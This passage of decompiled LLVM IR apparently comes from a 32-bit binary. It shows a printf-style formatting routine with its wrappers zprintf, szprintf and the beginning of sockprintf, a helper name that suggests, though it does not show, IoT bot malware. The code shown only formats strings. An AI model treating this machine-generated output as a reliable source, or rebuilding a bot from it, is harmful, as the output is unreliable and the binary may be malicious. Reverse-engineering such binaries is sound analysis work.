  store i8 45, i8* %v5_100009a4, align 1
  br label %dec_label_pc_100009b4

dec_label_pc_100009b4:                            ; preds = %dec_label_pc_1000094c, %dec_label_pc_10000974, %dec_label_pc_1000099c
  %stack_var_-28.1 = phi i8* [ %stack_var_-28.0.lcssa, %dec_label_pc_1000094c ], [ %v5_100009a4, %dec_label_pc_1000099c ], [ %stack_var_-28.0.lcssa, %dec_label_pc_10000974 ]
  %stack_var_-56.0 = phi i32 [ %arg5, %dec_label_pc_1000094c ], [ %arg5, %dec_label_pc_1000099c ], [ %v1_10000990, %dec_label_pc_10000974 ]
  %stack_var_-40.0 = phi i32 [ 0, %dec_label_pc_1000094c ], [ 0, %dec_label_pc_1000099c ], [ 1, %dec_label_pc_10000974 ]
  %v5_100009c4 = call i32 @prints(i32 %arg1, i8* %stack_var_-28.1, i32 %stack_var_-56.0, i32 %arg6)
  %v2_100009d0 = add i32 %v5_100009c4, %stack_var_-40.0
  br label %dec_label_pc_100009d8

dec_label_pc_100009d8:                            ; preds = %dec_label_pc_1000084c, %dec_label_pc_100009b4
  %storemerge = phi i32 [ %v2_100009d0, %dec_label_pc_100009b4 ], [ %v5_10000870, %dec_label_pc_1000084c ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8* %stack_var_-28.0.lcssa, { 2, 0, 1 }
  uselistorder i8* %v5_10000914, { 0, 2, 1 }
  uselistorder i32 %v2_100008d8, { 1, 0, 2 }
  uselistorder i32 %stack_var_-44.17, { 0, 2, 1 }
  uselistorder i32 %arg6, { 1, 0, 2 }
  uselistorder i32 %arg5, { 1, 3, 0, 2, 4 }
  uselistorder i32 %arg3, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 0, 2, 4, 1, 3, 5 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100009d8, { 1, 0 }
  uselistorder label %dec_label_pc_100009b4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000090c, { 1, 0 }
  uselistorder label %dec_label_pc_100008d0, { 1, 0 }
  uselistorder label %dec_label_pc_100008b8, { 3, 1, 0, 2 }
}

define i32 @print(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = inttoptr i32 %arg3 to i8*
  %tmp41 = ptrtoint i32* %arg1 to i32
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-68.427 = inttoptr i32 %arg2 to i8*
  %v2_10000fc828 = load i8, i8* %stack_var_-68.427, align 1
  %v3_10000fd031 = icmp eq i8 %v2_10000fc828, 0
  br i1 %v3_10000fd031, label %dec_label_pc_10000fd8, label %dec_label_pc_10000a24.lr.ph

dec_label_pc_10000a24.lr.ph:                      ; preds = %entry
  %v1_10000b98 = add i32 %arg3, 4
  %v2_10000b98 = inttoptr i32 %v1_10000b98 to i32*
  %v1_10000b60 = add i32 %arg3, 8
  %v2_10000b60 = inttoptr i32 %v1_10000b60 to i32*
  %v4_10000f7c = bitcast i32* %stack_var_-88 to i8*
  br label %dec_label_pc_10000a24

dec_label_pc_10000a24:                            ; preds = %dec_label_pc_10000a24.lr.ph, %dec_label_pc_10000fb8
  %stack_var_-68.434 = phi i8* [ %stack_var_-68.427, %dec_label_pc_10000a24.lr.ph ], [ %stack_var_-68.4, %dec_label_pc_10000fb8 ]
  %stack_var_-68.4.in33 = phi i32 [ %arg2, %dec_label_pc_10000a24.lr.ph ], [ %v1_10000fbc, %dec_label_pc_10000fb8 ]
  %stack_var_-56.132 = phi i32 [ 0, %dec_label_pc_10000a24.lr.ph ], [ %stack_var_-56.0, %dec_label_pc_10000fb8 ]
  %v2_10000a28 = load i8, i8* %stack_var_-68.434, align 1
  %v3_10000a30 = icmp eq i8 %v2_10000a28, 37
  br i1 %v3_10000a30, label %dec_label_pc_10000a38, label %dec_label_pc_10000f94

dec_label_pc_10000a38:                            ; preds = %dec_label_pc_10000a24
  %v1_10000a3c = add i32 %stack_var_-68.4.in33, 1
  %v5_10000a40 = inttoptr i32 %v1_10000a3c to i8*
  %v2_10000a58 = load i8, i8* %v5_10000a40, align 1
  %v3_10000a60 = icmp eq i8 %v2_10000a58, 0
  br i1 %v3_10000a60, label %dec_label_pc_10000fd8, label %dec_label_pc_10000a68

dec_label_pc_10000a68:                            ; preds = %dec_label_pc_10000a38
  %v2_10000a6c = load i8, i8* %v5_10000a40, align 1
  %v3_10000a74 = icmp eq i8 %v2_10000a6c, 37
  br i1 %v3_10000a74, label %dec_label_pc_10000f94, label %dec_label_pc_10000a7c

dec_label_pc_10000a7c:                            ; preds = %dec_label_pc_10000a68
  %v2_10000a80 = load i8, i8* %v5_10000a40, align 1
  %v3_10000a88 = icmp eq i8 %v2_10000a80, 45
  br i1 %v3_10000a88, label %dec_label_pc_10000a90, label %dec_label_pc_10000ac0.preheader

dec_label_pc_10000a90:                            ; preds = %dec_label_pc_10000a7c
  %v1_10000a94 = add i32 %stack_var_-68.4.in33, 2
  %v5_10000a98 = inttoptr i32 %v1_10000a94 to i8*
  br label %dec_label_pc_10000ac0.preheader

dec_label_pc_10000ac0.preheader:                  ; preds = %dec_label_pc_10000a90, %dec_label_pc_10000a7c
  %stack_var_-68.0.ph = phi i8* [ %v5_10000a40, %dec_label_pc_10000a7c ], [ %v5_10000a98, %dec_label_pc_10000a90 ]
  %stack_var_-52.0.ph = phi i32 [ 0, %dec_label_pc_10000a7c ], [ 1, %dec_label_pc_10000a90 ]
  %v4_10000ac03 = ptrtoint i8* %stack_var_-68.0.ph to i32
  %v2_10000ac44 = load i8, i8* %stack_var_-68.0.ph, align 1
  %v3_10000acc8 = icmp eq i8 %v2_10000ac44, 48
  br i1 %v3_10000acc8, label %dec_label_pc_10000aa8, label %dec_label_pc_10000b0c.preheader

dec_label_pc_10000aa8:                            ; preds = %dec_label_pc_10000ac0.preheader, %dec_label_pc_10000aa8
  %v4_10000ac010 = phi i32 [ %v1_10000aac, %dec_label_pc_10000aa8 ], [ %v4_10000ac03, %dec_label_pc_10000ac0.preheader ]
  %stack_var_-52.09 = phi i32 [ %v1_10000ab8, %dec_label_pc_10000aa8 ], [ %stack_var_-52.0.ph, %dec_label_pc_10000ac0.preheader ]
  %v1_10000aac = add i32 %v4_10000ac010, 1
  %v5_10000ab0 = inttoptr i32 %v1_10000aac to i8*
  %v1_10000ab8 = or i32 %stack_var_-52.09, 2
  %v2_10000ac4 = load i8, i8* %v5_10000ab0, align 1
  %v3_10000acc = icmp eq i8 %v2_10000ac4, 48
  br i1 %v3_10000acc, label %dec_label_pc_10000aa8, label %dec_label_pc_10000b0c.preheader

dec_label_pc_10000b0c.preheader:                  ; preds = %dec_label_pc_10000aa8, %dec_label_pc_10000ac0.preheader
  %stack_var_-52.0.lcssa = phi i32 [ %stack_var_-52.0.ph, %dec_label_pc_10000ac0.preheader ], [ %v1_10000ab8, %dec_label_pc_10000aa8 ]
  %stack_var_-68.0.lcssa = phi i8* [ %stack_var_-68.0.ph, %dec_label_pc_10000ac0.preheader ], [ %v5_10000ab0, %dec_label_pc_10000aa8 ]
  %v4_10000b0c12 = ptrtoint i8* %stack_var_-68.0.lcssa to i32
  %v2_10000b1013 = load i8, i8* %stack_var_-68.0.lcssa, align 1
  %tmp62 = icmp ult i8 %v2_10000b1013, 48
  br i1 %tmp62, label %dec_label_pc_10000b34, label %dec_label_pc_10000b20

dec_label_pc_10000ad8:                            ; preds = %dec_label_pc_10000b20
  %v1_10000adc = mul i32 %stack_var_-48.018, 10
  %v2_10000ae8 = load i8, i8* %stack_var_-68.119, align 1
  %v3_10000ae8 = zext i8 %v2_10000ae8 to i32
  %v2_10000af4 = add i32 %v1_10000adc, -48
  %v1_10000af8 = add i32 %v2_10000af4, %v3_10000ae8
  %v1_10000b04 = add i32 %v4_10000b0c20, 1
  %v5_10000b08 = inttoptr i32 %v1_10000b04 to i8*
  %v2_10000b10 = load i8, i8* %v5_10000b08, align 1
  %tmp63 = icmp ult i8 %v2_10000b10, 48
  br i1 %tmp63, label %dec_label_pc_10000b34, label %dec_label_pc_10000b20

dec_label_pc_10000b20:                            ; preds = %dec_label_pc_10000b0c.preheader, %dec_label_pc_10000ad8
  %v4_10000b0c20 = phi i32 [ %v1_10000b04, %dec_label_pc_10000ad8 ], [ %v4_10000b0c12, %dec_label_pc_10000b0c.preheader ]
  %stack_var_-68.119 = phi i8* [ %v5_10000b08, %dec_label_pc_10000ad8 ], [ %stack_var_-68.0.lcssa, %dec_label_pc_10000b0c.preheader ]
  %stack_var_-48.018 = phi i32 [ %v1_10000af8, %dec_label_pc_10000ad8 ], [ 0, %dec_label_pc_10000b0c.preheader ]
  %v2_10000b24 = load i8, i8* %stack_var_-68.119, align 1
  %tmp64 = icmp ult i8 %v2_10000b24, 58
  br i1 %tmp64, label %dec_label_pc_10000ad8, label %dec_label_pc_10000b34

dec_label_pc_10000b34:                            ; preds = %dec_label_pc_10000ad8, %dec_label_pc_10000b20, %dec_label_pc_10000b0c.preheader
  %stack_var_-48.0.lcssa = phi i32 [ 0, %dec_label_pc_10000b0c.preheader ], [ %v1_10000af8, %dec_label_pc_10000ad8 ], [ %stack_var_-48.018, %dec_label_pc_10000b20 ]
  %stack_var_-68.1.lcssa = phi i8* [ %stack_var_-68.0.lcssa, %dec_label_pc_10000b0c.preheader ], [ %v5_10000b08, %dec_label_pc_10000ad8 ], [ %stack_var_-68.119, %dec_label_pc_10000b20 ]
  %v2_10000b38 = load i8, i8* %stack_var_-68.1.lcssa, align 1
  %v3_10000b40 = icmp eq i8 %v2_10000b38, 115
  br i1 %v3_10000b40, label %dec_label_pc_10000b48, label %dec_label_pc_10000c08

dec_label_pc_10000b48:                            ; preds = %dec_label_pc_10000b34
  %v2_10000b4c = load i8, i8* %tmp, align 1
  %tmp65 = icmp ugt i8 %v2_10000b4c, 7
  br i1 %tmp65, label %dec_label_pc_10000b94, label %dec_label_pc_10000b5c

dec_label_pc_10000b5c:                            ; preds = %dec_label_pc_10000b48
  %v3_10000b60 = load i32, i32* %v2_10000b60, align 4
  %v2_10000b68 = load i8, i8* %tmp, align 1
  %v3_10000b68 = zext i8 %v2_10000b68 to i32
  %v1_10000b74 = mul nuw nsw i32 %v3_10000b68, 4
  %v2_10000b78 = add i32 %v1_10000b74, %v3_10000b60
  %v1_10000b80 = add i8 %v2_10000b68, 1
  store i8 %v1_10000b80, i8* %tmp, align 1
  br label %dec_label_pc_10000bac

dec_label_pc_10000b94:                            ; preds = %dec_label_pc_10000b48
  %v3_10000b98 = load i32, i32* %v2_10000b98, align 4
  %v1_10000ba0 = add i32 %v3_10000b98, 4
  store i32 %v1_10000ba0, i32* %v2_10000b98, align 4
  br label %dec_label_pc_10000bac

dec_label_pc_10000bac:                            ; preds = %dec_label_pc_10000b5c, %dec_label_pc_10000b94
  %stack_var_-20.0 = phi i32 [ %v3_10000b98, %dec_label_pc_10000b94 ], [ %v2_10000b78, %dec_label_pc_10000b5c ]
  %v1_10000bb0 = inttoptr i32 %stack_var_-20.0 to i32*
  %v2_10000bb0 = load i32, i32* %v1_10000bb0, align 4
  %v3_10000bbc = icmp eq i32 %v2_10000bb0, 0
  br i1 %v3_10000bbc, label %dec_label_pc_10000bd0, label %dec_label_pc_10000bc4

dec_label_pc_10000bc4:                            ; preds = %dec_label_pc_10000bac
  %v5_10000bc8 = inttoptr i32 %v2_10000bb0 to i8*
  br label %dec_label_pc_10000bdc

dec_label_pc_10000bd0:                            ; preds = %dec_label_pc_10000bac
  br label %dec_label_pc_10000bdc

dec_label_pc_10000bdc:                            ; preds = %dec_label_pc_10000bc4, %dec_label_pc_10000bd0
  %storemerge = phi i8* [ getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10015220.13, i32 0, i32 0), %dec_label_pc_10000bd0 ], [ %v5_10000bc8, %dec_label_pc_10000bc4 ]
  %v6_10000bf0 = call i32 @prints(i32 %tmp41, i8* %storemerge, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-52.0.lcssa)
  %v2_10000bfc = add i32 %v6_10000bf0, %stack_var_-56.132
  br label %dec_label_pc_10000fb8

dec_label_pc_10000c08:                            ; preds = %dec_label_pc_10000b34
  %v2_10000c0c = load i8, i8* %stack_var_-68.1.lcssa, align 1
  %v3_10000c14 = icmp eq i8 %v2_10000c0c, 100
  br i1 %v3_10000c14, label %dec_label_pc_10000c1c, label %dec_label_pc_10000cbc

dec_label_pc_10000c1c:                            ; preds = %dec_label_pc_10000c08
  %v2_10000c20 = load i8, i8* %tmp, align 1
  %tmp66 = icmp ugt i8 %v2_10000c20, 7
  br i1 %tmp66, label %dec_label_pc_10000c68, label %dec_label_pc_10000c30

dec_label_pc_10000c30:                            ; preds = %dec_label_pc_10000c1c
  %v3_10000c34 = load i32, i32* %v2_10000b60, align 4
  %v2_10000c3c = load i8, i8* %tmp, align 1
  %v3_10000c3c = zext i8 %v2_10000c3c to i32
  %v1_10000c48 = mul nuw nsw i32 %v3_10000c3c, 4
  %v2_10000c4c = add i32 %v1_10000c48, %v3_10000c34
  %v1_10000c54 = add i8 %v2_10000c3c, 1
  store i8 %v1_10000c54, i8* %tmp, align 1
  br label %dec_label_pc_10000c80

dec_label_pc_10000c68:                            ; preds = %dec_label_pc_10000c1c
  %v3_10000c6c = load i32, i32* %v2_10000b98, align 4
  %v1_10000c74 = add i32 %v3_10000c6c, 4
  store i32 %v1_10000c74, i32* %v2_10000b98, align 4
  br label %dec_label_pc_10000c80

dec_label_pc_10000c80:                            ; preds = %dec_label_pc_10000c30, %dec_label_pc_10000c68
  %stack_var_-28.0 = phi i32 [ %v3_10000c6c, %dec_label_pc_10000c68 ], [ %v2_10000c4c, %dec_label_pc_10000c30 ]
  %v1_10000c84 = inttoptr i32 %stack_var_-28.0 to i32*
  %v2_10000c84 = load i32, i32* %v1_10000c84, align 4
  %v7_10000ca4 = call i32 @printi(i32 %tmp41, i32 %v2_10000c84, i32 10, i32 1, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-52.0.lcssa, i32 97)
  %v2_10000cb0 = add i32 %v7_10000ca4, %stack_var_-56.132
  br label %dec_label_pc_10000fb8

dec_label_pc_10000cbc:                            ; preds = %dec_label_pc_10000c08
  %v2_10000cc0 = load i8, i8* %stack_var_-68.1.lcssa, align 1
  %v3_10000cc8 = icmp eq i8 %v2_10000cc0, 120
  br i1 %v3_10000cc8, label %dec_label_pc_10000cd0, label %dec_label_pc_10000d70

dec_label_pc_10000cd0:                            ; preds = %dec_label_pc_10000cbc
  %v2_10000cd4 = load i8, i8* %tmp, align 1
  %tmp67 = icmp ugt i8 %v2_10000cd4, 7
  br i1 %tmp67, label %dec_label_pc_10000d1c, label %dec_label_pc_10000ce4

dec_label_pc_10000ce4:                            ; preds = %dec_label_pc_10000cd0
  %v3_10000ce8 = load i32, i32* %v2_10000b60, align 4
  %v2_10000cf0 = load i8, i8* %tmp, align 1
  %v3_10000cf0 = zext i8 %v2_10000cf0 to i32
  %v1_10000cfc = mul nuw nsw i32 %v3_10000cf0, 4
  %v2_10000d00 = add i32 %v1_10000cfc, %v3_10000ce8
  %v1_10000d08 = add i8 %v2_10000cf0, 1
  store i8 %v1_10000d08, i8* %tmp, align 1
  br label %dec_label_pc_10000d34

dec_label_pc_10000d1c:                            ; preds = %dec_label_pc_10000cd0
  %v3_10000d20 = load i32, i32* %v2_10000b98, align 4
  %v1_10000d28 = add i32 %v3_10000d20, 4
  store i32 %v1_10000d28, i32* %v2_10000b98, align 4
  br label %dec_label_pc_10000d34

dec_label_pc_10000d34:                            ; preds = %dec_label_pc_10000ce4, %dec_label_pc_10000d1c
  %stack_var_-32.0 = phi i32 [ %v3_10000d20, %dec_label_pc_10000d1c ], [ %v2_10000d00, %dec_label_pc_10000ce4 ]
  %v1_10000d38 = inttoptr i32 %stack_var_-32.0 to i32*
  %v2_10000d38 = load i32, i32* %v1_10000d38, align 4
  %v7_10000d58 = call i32 @printi(i32 %tmp41, i32 %v2_10000d38, i32 16, i32 0, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-52.0.lcssa, i32 97)
  %v2_10000d64 = add i32 %v7_10000d58, %stack_var_-56.132
  br label %dec_label_pc_10000fb8

dec_label_pc_10000d70:                            ; preds = %dec_label_pc_10000cbc
  %v2_10000d74 = load i8, i8* %stack_var_-68.1.lcssa, align 1
  %v3_10000d7c = icmp eq i8 %v2_10000d74, 88
  br i1 %v3_10000d7c, label %dec_label_pc_10000d84, label %dec_label_pc_10000e24

dec_label_pc_10000d84:                            ; preds = %dec_label_pc_10000d70
  %v2_10000d88 = load i8, i8* %tmp, align 1
  %tmp68 = icmp ugt i8 %v2_10000d88, 7
  br i1 %tmp68, label %dec_label_pc_10000dd0, label %dec_label_pc_10000d98

dec_label_pc_10000d98:                            ; preds = %dec_label_pc_10000d84
  %v3_10000d9c = load i32, i32* %v2_10000b60, align 4
  %v2_10000da4 = load i8, i8* %tmp, align 1
  %v3_10000da4 = zext i8 %v2_10000da4 to i32
  %v1_10000db0 = mul nuw nsw i32 %v3_10000da4, 4
  %v2_10000db4 = add i32 %v1_10000db0, %v3_10000d9c
  %v1_10000dbc = add i8 %v2_10000da4, 1
  store i8 %v1_10000dbc, i8* %tmp, align 1
  br label %dec_label_pc_10000de8

dec_label_pc_10000dd0:                            ; preds = %dec_label_pc_10000d84
  %v3_10000dd4 = load i32, i32* %v2_10000b98, align 4
  %v1_10000ddc = add i32 %v3_10000dd4, 4
  store i32 %v1_10000ddc, i32* %v2_10000b98, align 4
  br label %dec_label_pc_10000de8

dec_label_pc_10000de8:                            ; preds = %dec_label_pc_10000d98, %dec_label_pc_10000dd0
  %stack_var_-36.0 = phi i32 [ %v3_10000dd4, %dec_label_pc_10000dd0 ], [ %v2_10000db4, %dec_label_pc_10000d98 ]
  %v1_10000dec = inttoptr i32 %stack_var_-36.0 to i32*
  %v2_10000dec = load i32, i32* %v1_10000dec, align 4
  %v7_10000e0c = call i32 @printi(i32 %tmp41, i32 %v2_10000dec, i32 16, i32 0, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-52.0.lcssa, i32 65)
  %v2_10000e18 = add i32 %v7_10000e0c, %stack_var_-56.132
  br label %dec_label_pc_10000fb8

dec_label_pc_10000e24:                            ; preds = %dec_label_pc_10000d70
  %v2_10000e28 = load i8, i8* %stack_var_-68.1.lcssa, align 1
  %v3_10000e30 = icmp eq i8 %v2_10000e28, 117
  br i1 %v3_10000e30, label %dec_label_pc_10000e38, label %dec_label_pc_10000ed8

dec_label_pc_10000e38:                            ; preds = %dec_label_pc_10000e24
  %v2_10000e3c = load i8, i8* %tmp, align 1
  %tmp69 = icmp ugt i8 %v2_10000e3c, 7
  br i1 %tmp69, label %dec_label_pc_10000e84, label %dec_label_pc_10000e4c

dec_label_pc_10000e4c:                            ; preds = %dec_label_pc_10000e38
  %v3_10000e50 = load i32, i32* %v2_10000b60, align 4
  %v2_10000e58 = load i8, i8* %tmp, align 1
  %v3_10000e58 = zext i8 %v2_10000e58 to i32
  %v1_10000e64 = mul nuw nsw i32 %v3_10000e58, 4
  %v2_10000e68 = add i32 %v1_10000e64, %v3_10000e50
  %v1_10000e70 = add i8 %v2_10000e58, 1
  store i8 %v1_10000e70, i8* %tmp, align 1
  br label %dec_label_pc_10000e9c

dec_label_pc_10000e84:                            ; preds = %dec_label_pc_10000e38
  %v3_10000e88 = load i32, i32* %v2_10000b98, align 4
  %v1_10000e90 = add i32 %v3_10000e88, 4
  store i32 %v1_10000e90, i32* %v2_10000b98, align 4
  br label %dec_label_pc_10000e9c

dec_label_pc_10000e9c:                            ; preds = %dec_label_pc_10000e4c, %dec_label_pc_10000e84
  %stack_var_-40.0 = phi i32 [ %v3_10000e88, %dec_label_pc_10000e84 ], [ %v2_10000e68, %dec_label_pc_10000e4c ]
  %v1_10000ea0 = inttoptr i32 %stack_var_-40.0 to i32*
  %v2_10000ea0 = load i32, i32* %v1_10000ea0, align 4
  %v7_10000ec0 = call i32 @printi(i32 %tmp41, i32 %v2_10000ea0, i32 10, i32 0, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-52.0.lcssa, i32 97)
  %v2_10000ecc = add i32 %v7_10000ec0, %stack_var_-56.132
  br label %dec_label_pc_10000fb8

dec_label_pc_10000ed8:                            ; preds = %dec_label_pc_10000e24
  %v2_10000edc = load i8, i8* %stack_var_-68.1.lcssa, align 1
  %v3_10000ee4 = icmp eq i8 %v2_10000edc, 99
  br i1 %v3_10000ee4, label %dec_label_pc_10000eec, label %dec_label_pc_10000fb8

dec_label_pc_10000eec:                            ; preds = %dec_label_pc_10000ed8
  %v2_10000ef0 = load i8, i8* %tmp, align 1
  %tmp70 = icmp ugt i8 %v2_10000ef0, 7
  br i1 %tmp70, label %dec_label_pc_10000f38, label %dec_label_pc_10000f00

dec_label_pc_10000f00:                            ; preds = %dec_label_pc_10000eec
  %v3_10000f04 = load i32, i32* %v2_10000b60, align 4
  %v2_10000f0c = load i8, i8* %tmp, align 1
  %v3_10000f0c = zext i8 %v2_10000f0c to i32
  %v1_10000f18 = mul nuw nsw i32 %v3_10000f0c, 4
  %v2_10000f1c = add i32 %v1_10000f18, %v3_10000f04
  %v1_10000f24 = add i8 %v2_10000f0c, 1
  store i8 %v1_10000f24, i8* %tmp, align 1
  br label %dec_label_pc_10000f50

dec_label_pc_10000f38:                            ; preds = %dec_label_pc_10000eec
  %v3_10000f3c = load i32, i32* %v2_10000b98, align 4
  %v1_10000f44 = add i32 %v3_10000f3c, 4
  store i32 %v1_10000f44, i32* %v2_10000b98, align 4
  br label %dec_label_pc_10000f50

dec_label_pc_10000f50:                            ; preds = %dec_label_pc_10000f00, %dec_label_pc_10000f38
  %stack_var_-44.0 = phi i32 [ %v3_10000f3c, %dec_label_pc_10000f38 ], [ %v2_10000f1c, %dec_label_pc_10000f00 ]
  %v1_10000f54 = inttoptr i32 %stack_var_-44.0 to i32*
  %v2_10000f54 = load i32, i32* %v1_10000f54, align 4
  %v1_10000f58 = urem i32 %v2_10000f54, 256
  store i32 %v1_10000f58, i32* %stack_var_-88, align 4
  %v5_10000f7c = call i32 @prints(i32 %tmp41, i8* %v4_10000f7c, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-52.0.lcssa)
  %v2_10000f88 = add i32 %v5_10000f7c, %stack_var_-56.132
  br label %dec_label_pc_10000fb8

dec_label_pc_10000f94:                            ; preds = %dec_label_pc_10000a24, %dec_label_pc_10000a68
  %stack_var_-68.2 = phi i8* [ %v5_10000a40, %dec_label_pc_10000a68 ], [ %stack_var_-68.434, %dec_label_pc_10000a24 ]
  %v2_10000f98 = load i8, i8* %stack_var_-68.2, align 1
  %v3_10000f98 = zext i8 %v2_10000f98 to i32
  %v3_10000fa8 = call i32 @printchar(i32* %arg1, i32 %v3_10000f98)
  %v1_10000fb0 = add i32 %stack_var_-56.132, 1
  br label %dec_label_pc_10000fb8

dec_label_pc_10000fb8:                            ; preds = %dec_label_pc_10000ed8, %dec_label_pc_10000f50, %dec_label_pc_10000e9c, %dec_label_pc_10000de8, %dec_label_pc_10000d34, %dec_label_pc_10000c80, %dec_label_pc_10000bdc, %dec_label_pc_10000f94
  %stack_var_-56.0 = phi i32 [ %v1_10000fb0, %dec_label_pc_10000f94 ], [ %v2_10000bfc, %dec_label_pc_10000bdc ], [ %v2_10000cb0, %dec_label_pc_10000c80 ], [ %v2_10000d64, %dec_label_pc_10000d34 ], [ %v2_10000e18, %dec_label_pc_10000de8 ], [ %v2_10000ecc, %dec_label_pc_10000e9c ], [ %v2_10000f88, %dec_label_pc_10000f50 ], [ %stack_var_-56.132, %dec_label_pc_10000ed8 ]
  %stack_var_-68.3 = phi i8* [ %stack_var_-68.2, %dec_label_pc_10000f94 ], [ %stack_var_-68.1.lcssa, %dec_label_pc_10000bdc ], [ %stack_var_-68.1.lcssa, %dec_label_pc_10000c80 ], [ %stack_var_-68.1.lcssa, %dec_label_pc_10000d34 ], [ %stack_var_-68.1.lcssa, %dec_label_pc_10000de8 ], [ %stack_var_-68.1.lcssa, %dec_label_pc_10000e9c ], [ %stack_var_-68.1.lcssa, %dec_label_pc_10000f50 ], [ %stack_var_-68.1.lcssa, %dec_label_pc_10000ed8 ]
  %v4_10000fb8 = ptrtoint i8* %stack_var_-68.3 to i32
  %v1_10000fbc = add i32 %v4_10000fb8, 1
  %stack_var_-68.4 = inttoptr i32 %v1_10000fbc to i8*
  %v2_10000fc8 = load i8, i8* %stack_var_-68.4, align 1
  %v3_10000fd0 = icmp eq i8 %v2_10000fc8, 0
  br i1 %v3_10000fd0, label %dec_label_pc_10000fd8, label %dec_label_pc_10000a24

dec_label_pc_10000fd8:                            ; preds = %dec_label_pc_10000a38, %dec_label_pc_10000fb8, %entry
  %stack_var_-56.1.lcssa = phi i32 [ 0, %entry ], [ %stack_var_-56.132, %dec_label_pc_10000a38 ], [ %stack_var_-56.0, %dec_label_pc_10000fb8 ]
  %v3_10000fdc = icmp eq i32* %arg1, null
  br i1 %v3_10000fdc, label %dec_label_pc_10000ff4, label %dec_label_pc_10000fe4

dec_label_pc_10000fe4:                            ; preds = %dec_label_pc_10000fd8
  %v2_10000fe8 = load i32, i32* %arg1, align 4
  %v3_10000ff0 = inttoptr i32 %v2_10000fe8 to i8*
  store i8 0, i8* %v3_10000ff0, align 1
  br label %dec_label_pc_10000ff4

dec_label_pc_10000ff4:                            ; preds = %dec_label_pc_10000fd8, %dec_label_pc_10000fe4
  ret i32 %stack_var_-56.1.lcssa

; uselistorder directives
  uselistorder i8* %stack_var_-68.4, { 1, 0 }
  uselistorder i8* %stack_var_-68.1.lcssa, { 12, 11, 9, 7, 5, 3, 1, 10, 8, 6, 4, 2, 0 }
  uselistorder i32 %stack_var_-48.0.lcssa, { 5, 4, 3, 2, 1, 0 }
  uselistorder i8* %stack_var_-68.0.lcssa, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-52.0.lcssa, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_10000aac, { 1, 0 }
  uselistorder i32 %stack_var_-52.0.ph, { 1, 0 }
  uselistorder i8* %v5_10000a40, { 2, 0, 1, 3, 4 }
  uselistorder i32 %stack_var_-56.132, { 0, 8, 7, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 %stack_var_-68.4.in33, { 1, 0 }
  uselistorder i32* %v2_10000b98, { 1, 0, 3, 2, 5, 4, 7, 6, 9, 8, 10, 11 }
  uselistorder i32* %stack_var_-88, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @printi, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i8*, i32, i32)* @prints, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_10000ff4, { 1, 0 }
  uselistorder label %dec_label_pc_10000fd8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10000fb8, { 7, 1, 0, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_10000f94, { 1, 0 }
  uselistorder label %dec_label_pc_10000f50, { 1, 0 }
  uselistorder label %dec_label_pc_10000e9c, { 1, 0 }
  uselistorder label %dec_label_pc_10000de8, { 1, 0 }
  uselistorder label %dec_label_pc_10000d34, { 1, 0 }
  uselistorder label %dec_label_pc_10000c80, { 1, 0 }
  uselistorder label %dec_label_pc_10000bdc, { 1, 0 }
  uselistorder label %dec_label_pc_10000bac, { 1, 0 }
  uselistorder label %dec_label_pc_10000b34, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10000b20, { 1, 0 }
  uselistorder label %dec_label_pc_10000aa8, { 1, 0 }
  uselistorder label %dec_label_pc_10000a24, { 1, 0 }
}

define i32 @zprintf(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-136 = alloca i32, align 4
  store i32 1, i32* %stack_var_-136, align 4
  %v2_10001094 = ptrtoint i32* %stack_var_-136 to i32
  store i32 268439712, i32* @lr, align 4
  %v4_1000109c = call i32 @print(i32* null, i32 %arg1, i32 %v2_10001094)
  ret i32 %v4_1000109c

; uselistorder directives
  uselistorder i32* %stack_var_-136, { 1, 0 }
}

define i32 @szprintf(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-120, align 4
  store i32 2, i32* %stack_var_-136, align 4
  %v2_10001144 = ptrtoint i32* %stack_var_-136 to i32
  store i32 268439888, i32* @lr, align 4
  %v4_1000114c = call i32 @print(i32* nonnull %stack_var_-120, i32 %arg2, i32 %v2_10001144)
  ret i32 %v4_1000114c

; uselistorder directives
  uselistorder i32* %stack_var_-136, { 1, 0 }
}

define i32 @sockprintf(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  store i32 2048, i32* @r3, align 4
  store i32 268440016, i32* @lr, align 4
  %v0_100011cc = call i32 @malloc()
  store i32 %v0_100011cc, i32* %stack_var_-144, align 4
  store i32 268440048, i32* @lr, align 4
  %v3_100011ec = call i32 @__GI_memset(i32 %v0_100011cc, i32 0, i32 2048)
  store i32 2, i32* %stack_var_-140, align 4
  %v2_10001220 = ptrtoint i32* %stack_var_-140 to i32
  store i32 268440116, i32* @lr, align 4
  %v4_10001230 = call i32 @print(i32* nonnull %stack_var_-144, i32 %arg2, i32 %v2_10001220)
  store i32 %v0_100011cc, i32* @r3, align 4
  %v0_10001238 = call i32 @__GI_strlen()
  %v2_10001248 = add i32 %v0_10001238, %v0_100011cc
  %v3_10001250 = inttoptr i32 %v2_10001248 to i8*
  store i8 10, i8* %v3_10001250, align 1
  store i32 %v0_100011cc, i32* @r3, align 4
  %v0_10001258 = call i32 @__GI_strlen()
